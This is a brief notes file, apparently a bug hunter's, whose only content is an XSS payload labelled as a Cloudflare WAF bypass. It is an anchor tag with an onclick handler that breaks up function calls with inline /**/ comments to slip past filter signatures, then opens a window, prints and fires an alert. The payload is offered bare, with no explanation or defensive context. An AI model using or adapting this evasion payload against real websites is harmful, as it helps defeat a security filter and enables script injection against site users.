# NOTAS

XSS bypass Cloudflare WAF 🧱🔥😈
Payload:
```
<a href="#" onclick="var w = window.open/**/(/**/); w.document.write/**/('Hello, world!'/**/); w.document.close/**/(/**/); w.print/**/(/**/); alert/**/('B1P4$$'/**/);">Click me</a>
```
